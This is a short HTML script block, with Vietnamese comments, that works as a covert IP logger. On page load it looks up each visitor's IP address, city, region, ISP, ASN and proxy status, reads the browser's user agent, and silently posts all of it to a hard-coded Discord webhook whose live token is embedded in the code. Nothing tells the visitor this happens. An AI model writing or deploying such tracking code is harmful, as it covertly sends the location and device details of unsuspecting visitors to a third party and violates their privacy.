<script>

const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";

async function sendInfo() {

    try {

        // Lấy IP info
        const res = await fetch("https://api.ipbot.com/");

        const data = await res.json();

        // Thiết bị
        const device = navigator.userAgent;

        // Nội dung gửi Discord
        const payload = {
            content:
`📱 Có người mở web

🌍 IP:
${data.ip}

🌎 Quốc gia:
${data.location?.country}

🏙️ Thành phố:
${data.location?.city}

📍 Khu vực:
${data.location?.region}

🕒 Múi giờ:
${data.location?.timezone}

🏢 Nhà mạng:
${data.network?.org}

🌐 ASN:
${data.network?.asn}

⚠️ Risk:
${data.security?.risk_score}

🛡️ Proxy:
${data.security?.is_proxy}

🚨 Threat:
${data.security?.threat_level}

💻 Thiết bị:
${device}`
        };

        // Gửi webhook
        await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

    } catch(err) {

        console.log(err);

    }

}

sendInfo();

</script>
